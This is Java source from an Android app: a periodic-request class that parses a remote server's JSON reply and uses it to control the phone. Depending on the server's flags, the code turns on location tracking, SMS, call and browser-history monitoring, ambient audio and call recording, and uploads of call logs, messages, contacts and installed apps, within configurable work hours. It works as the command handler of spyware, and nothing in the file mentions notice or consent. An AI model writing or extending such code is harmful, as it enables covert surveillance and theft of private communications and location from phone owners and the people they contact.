package com.inet.android.request;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.bs.ServiceControl;
import com.inet.android.info.DeviceInformation;
import com.inet.android.list.TurnSendList;
import com.inet.android.sms.SmsSentObserver;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

/**
 * Periodic request class is designed to handle the server's response
 * 
 * @author johny homicide
 * 
 */
public class PeriodicRequest extends DefaultRequest {
	private final String LOG_TAG = PeriodicRequest.class.getSimpleName()
			.toString();
	SmsSentObserver smsSentObserver = null;
	boolean periodicalFlag = true;
	private Context mContext;

	public PeriodicRequest(Context ctx) {
		super(ctx);
		this.mContext = ctx;
	}

	@Override
	public void sendRequest(String request) {
		PeriodicRequestTask frt = new PeriodicRequestTask();
		frt.execute(request);
	}

	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		String str = null;
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		try {
			str = Caller.doMake(null, sp.getString("access_second_token", ""),
					ConstantValue.PERIODIC_LINK, true, null, mContext);
		} catch (IOException e) {
			e.printStackTrace();
			Logging.doLog(LOG_TAG, "IOException e PeriodicRequest",
					"IOException e PeriodicRequest");
		}
		if (str != null && str.length() > 3)
			getRequestData(str);
		else {
			ParsingErrors.setError(str, "",
					ConstantValue.TYPE_PERIODIC_REQUEST, -1, "", -1, mContext);
			Logging.doLog(LOG_TAG, "ответа от сервера нет",
					"ответа от сервера нет");

		}

	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);

		Editor ed = sp.edit();
		JSONObject jsonObject;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			return;
		}

		String str = null;

		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("code_periodic", str);
		} else {
			ed.putString("code_periodic", "");
		}

		// -------------want to remove the device--------
		if (str.equals("3")) {
			Logging.doLog(LOG_TAG, "want to remove the device",
					"want to remove the device");
			String keyRemoval = null;
			try {
				keyRemoval = jsonObject.getString("key");
			} catch (JSONException e) {
				keyRemoval = null;
			}
			if (keyRemoval != null) {
				ed.putString("key_removal", keyRemoval);
			} else {
				ed.putString("key_removal", "");
			}
			return;
		}

		// ----------------errors-----------------
		if (str.equals("0")) {
			ParsingErrors.setError(response, mContext);
			return;
		}

		// -----------active mode-----------------
		if (str.equals("2")) {
			if (sp.getBoolean("is_info", false) == true) {
				DeviceInformation device = new DeviceInformation(mContext);
				device.getInfo();
				ServiceControl.runService(mContext);
				ed.putBoolean("is_info", false);
			}
			ed.putString("period", "1");
			ed.commit();
		}

		// ----------frequency location 0 - off ------------
		try {
			str = jsonObject.getString("geo");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ValueWork.changeValueMethod(
					ConstantValue.TYPE_LOCATION_TRACKER_REQUEST, str, mContext);
			ed.putString("geo", str);
		} else {
			ed.putString("geo", "0");
		}

		/*
		 * positioning mode 0 - network, 1 - gps ---------
		 */
		try {
			str = jsonObject.getString("geo_mode");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ValueWork.changeValueMethod(ConstantValue.LOCATION_TRACKER_MODE,
					str, mContext);
			ed.putString("geo_mode", str);
		} else {
			ed.putString("geo_mode", "0");
		}

		// -----------monitoring sms----------------
		try {
			str = jsonObject.getString("sms");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ValueWork.changeValueMethod(
					ConstantValue.TYPE_INCOMING_SMS_REQUEST, str, mContext);
			ed.putString("sms", str);
		} else {
			ed.putString("sms", "0");
		}

		// ------------monitoring of calls--------------
		try {
			str = jsonObject.getString("call");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("call", str);
		} else {
			ed.putString("call", "0");
		}

		// ----------monitoring browser history-----------
		try {
			str = jsonObject.getString("www");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ValueWork.changeValueMethod(
					ConstantValue.TYPE_HISTORY_BROUSER_REQUEST, str, mContext);
			ed.putString("www", str);
		} else {
			ed.putString("www", "0");
		}

		// ----------key for record-----------
		try {
			str = jsonObject.getString("key_rec");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("key_rec", str);
		} else {
			ed.putString("key_rec", "0");
		}

		// ----------the number of minutes of Dictaphone-----------
		try {
			str = jsonObject.getString("rec_env");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("rec_env", str);
		} else {
			ed.putString("rec_env", "0");
		}

		// ----------record call-----------
		try {
			str = jsonObject.getString("rec_call");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("rec_call", str);
		} else {
			ed.putString("rec_call", "0");
		}

		// --recording situation after a telephone conversation-------
		try {
			str = jsonObject.getString("rec_env_call");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("rec_env_call", str);
		} else {
			ed.putString("rec_env_call", "0");
		}

		// ----------time server-----------
		try {
			str = jsonObject.getString("UTCT");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("UTCT", str);
		} else {
			ed.putString("UTCT", "0");
		}

		// --------start time work------------
		try {
			str = jsonObject.getString("time_from");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("time_from", str);
		} else {
			ed.putString("time_from", "");
		}

		// ------------stop time---------------
		try {
			str = jsonObject.getString("time_to");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("time_to", str);
		} else {
			ed.putString("time_to", "");
		}

		// ---------lunchtime start-------------
		try {
			str = jsonObject.getString("brk_from");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("brk_from", str);
		} else {
			ed.putString("brk_from", "");
		}

		// ---------lunchtime stop----------------
		try {
			str = jsonObject.getString("brk_to");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("brk_to", str);
		} else {
			ed.putString("brk_to", "");
		}

		// ----------------image and audio detect----------------------
		String image = null;
		String audio = null;
		try {
			image = jsonObject.getString("image");
			audio = jsonObject.getString("audio");
		} catch (JSONException e) {
			str = null;
		}
		if (image != null)
			ed.putString("image", image);
		if (audio != null)
			ed.putString("audio", audio);

		// ----------------method of sending files----------------------
		try {
			str = jsonObject.getString("dispatch");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			ed.putString("dispatch", str);
		else
			ed.putString("dispatch", str);

		// ---------------calls list------------------------
		try {
			str = jsonObject.getString("calls_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0")
					&& sp.getInt("list_call", 0) != Integer.parseInt(str)) {
				TurnSendList.setList(ConstantValue.TYPE_LIST_CALL,
						Integer.parseInt(str), null, mContext);
			}

		// ---------------sms list------------------------
		try {
			str = jsonObject.getString("sms_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0")
					&& sp.getInt("list_sms", 0) != Integer.parseInt(str)) {
				TurnSendList.setList(ConstantValue.TYPE_LIST_SMS,
						Integer.parseInt(str), null, mContext);
			}

		// ---------------contacts list------------------------
		try {
			str = jsonObject.getString("contacts_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0")
					&& sp.getInt("list_contact", 0) != Integer.parseInt(str)) {
				TurnSendList.setList(ConstantValue.TYPE_LIST_CONTACTS,
						Integer.parseInt(str), null, mContext);
			}

		// ---------------apps list------------------------
		try {
			str = jsonObject.getString("apps_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0")
					&& sp.getInt("list_app", 0) != Integer.parseInt(str)) {
				TurnSendList.setList(ConstantValue.TYPE_LIST_APP,
						Integer.parseInt(str), null, mContext);
			}
		ed.commit();
		ServiceControl.trackerStateService(mContext);
	}

	@Override
	public void sendRequest(int request) {
		// TODO Auto-generated method stub

	}
}